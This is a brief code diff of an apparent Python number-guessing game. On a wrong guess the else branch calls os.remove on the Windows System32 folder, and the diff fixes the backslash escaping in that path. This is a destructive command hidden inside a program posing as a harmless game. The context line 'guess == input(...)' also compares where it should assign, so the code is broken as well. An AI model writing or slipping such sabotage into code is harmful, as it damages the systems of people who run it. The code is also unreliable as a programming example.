@@ -7,4 +7,4 @@ guess == input("Guess: ")
 if guess == x:
   print("You win! Congrats")
 else:
-  os.remove("C:\Windows\System32")
+  os.remove("C:\\Windows\\System32")
